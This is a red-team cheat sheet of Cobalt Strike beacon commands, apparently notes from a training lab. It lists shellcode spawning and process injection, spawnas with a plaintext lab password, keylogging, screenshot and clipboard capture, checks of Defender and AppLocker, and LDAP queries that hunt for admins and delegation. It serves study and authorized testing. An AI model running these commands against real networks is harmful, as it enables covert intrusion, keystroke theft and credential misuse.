# Enumeration (Cobalt Strike)

---

## Session Passing

### Spawn New Beacon

```
# Create new process and inject shellcode (ensure listener exists)
spawn x64 http
spawn x86 http
```

### Spawn as Another User

```
cd C:\Windows\Temp
spawnas INLANEFREIGHT\tmorgan Passw0rd! tcp-local
```

---

## Process Migration

Stay in processes that SHOULD have network connections.

```
# Spawn windowless process to inject into
execute C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe

# Inject into the process
inject <pid> x64 http
```

---

## Host Enumeration

### File System

```
ls C:\
ls C:\Program Files
ls C:\Program Files (x86)
ls C:\Users\<USERNAME>
ls C:\Users\<USERNAME>\Desktop
ls C:\Users\<USERNAME>\Downloads
ls C:\Users\<USERNAME>\Documents
ls C:\Users\<USERNAME>\AppData
ls C:\Users\<USERNAME>\AppData\Roaming
ls C:\Users\<USERNAME>\AppData\Local
```

### Software and Services

```
# Software on host
reg query x64 HKLM\SOFTWARE

# Get PATH
env

# Get all services
sc_enum

# OR via registry
reg query x64 HKLM\SYSTEM\CurrentControlSet\Services

# Query specific service
reg query x64 HKLM\SYSTEM\CurrentControlSet\Services\ServiceName
```

### Drives

```
drives
```

### Keylogger

```
# Get process architecture first
ps

# Start keylogger
keylogger <PID> [x86|x64]

# View output: View > Keystrokes
```

### Clipboard and Screenshot

```
clipboard
screenshot [pid] [x86|x64]
```

---

## Registry

```
# View all key-value pairs
reg query x64 HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System

# View specific value
reg queryv x64 HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System ConsentPromptBehaviorAdmin
```

---

## Job Management

```
# View jobs
jobs

# Kill job
jobkill 0
```

---

## Program Execution

| Command | Description |
|---------|-------------|
| `shell whoami /user` | Passes to `cmd.exe /c` |
| `run cmd.exe /c whoami` | Executes program directly |
| `powershell $env:computername` | Direct PowerShell cmdlets |
| `powerpick $env:computername` | Unmanaged PowerShell (better OPSEC) |
| `psinject 19508 x64 Get-ChildItem C:\` | Inject PowerShell DLL into remote process |

### Import and Run Scripts

```
powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
powerpick Get-Domain
```

### Execute .NET Assembly

```
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe AntiVirus
```

---

## AV Enumeration

### Local

```
ps
powerpick Get-MpPreference

# If Defender not enabled (3rd party AV)
# ERROR: Get-MpPreference : Operation failed with the following error: 0x800106ba

reg query x64 HKLM\SOFTWARE\Microsoft\Windows Defender
# Look for:
#   IsServiceRunning    REG_DWORD    0x1
#   DisableAntiSpyware  REG_DWORD    0x0
#   DisableAntiVirus    REG_DWORD    0x0

reg query x64 HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection
reg query x64 HKLM\SOFTWARE\Microsoft\Windows Defender\SpyNet
reg query x64 HKLM\SOFTWARE\Microsoft\Windows Defender\Features

# Requires Administrator
reg query x64 HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions
reg query x64 HKLM\SOFTWARE\Microsoft\Windows Defender\Windows Defender Exploit Guard\ASR
```

### Remote (via WinRM)

```
remote-exec winrm ilf-ws-1 tasklist /svc

remote-exec winrm ilf-ws-1 Get-MpComputerStatus | select QuickScanStartTime,IsTamperProtected,IoavProtectionEnabled,BehaviorMonitorEnabled,AntivirusEnabled,AntispywareEnabled

remote-exec winrm ilf-ws-1 Get-MpPreference | select DisableBehaviorMonitoring,DisableBlockAtFirstSeen,DisableRealtimeMonitoring,Exclusion*

# Check for AppLocker
remote-exec winrm ilf-ws-1 Get-ChildItem HKLM:Software\Policies\Microsoft\Windows\SrpV2
```

---

## LDAP Enumeration

### SIDs

```
# Get SID from username
ldapsearch (&(objectClass=user)(sAMAccountName=pchilds))

# Get SID and sAMAccountName for all users
ldapsearch (objectClass=user) --attributes sAMAccountName,objectSid

# Get all computers
ldapsearch (objectClass=computer) --attributes cn,distinguishedName,objectSid,sAMAccountName,operatingSystem,operatingSystemVersion,dNSHostName
```

### Domain Users

> **NEVER RUN `(objectClass=*)`**

```
# All users (SAM_NORMAL_USER_ACCOUNT)
ldapsearch (samAccountType=805306368)

# Users with adminCount=1
ldapsearch (&(samAccountType=805306368)(adminCount=1))

# Exclude krbtgt
ldapsearch (&(samAccountType=805306368)(adminCount=1)(!(name=krbtgt)))

# With specific attributes
ldapsearch (&(samAccountType=805306368)(adminCount=1)) --attributes name,memberof

# Search by description/name
ldapsearch (&(samAccountType=805306368)(|(description=*admin*)(samaccountname=*adm*)))
```

### BOFHound Compatible Queries

```
# ntsecuritydescriptor is mandatory for BOFHound parsing
ldapsearch (&(samAccountType=805306368)(adminCount=1)) --attributes samaccounttype,distinguishedname,objectsid,ntsecuritydescriptor
```

### Group Membership (Recursive)

```
# All Domain Admins (unnests groups)
ldapsearch "(memberof:1.2.840.113556.1.4.1941:=CN=Domain Admins,CN=Users,DC=inlanefreight,DC=local)" --attributes samaccountname

# All groups
ldapsearch (objectClass=group) --attributes cn,description,member,distinguishedName,name,adminCount,sAMAccountName,objectSid
```

### Bitwise Filters

| OID | Rule |
|-----|------|
| 1.2.840.113556.1.4.803 | LDAP_MATCHING_RULE_BIT_AND |
| 1.2.840.113556.1.4.804 | LDAP_MATCHING_RULE_BIT_OR |
| 1.2.840.113556.1.4.1941 | LDAP_MATCHING_RULE_IN_CHAIN |

```
# Find computers with unconstrained delegation (524288)
ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samaccountname
```
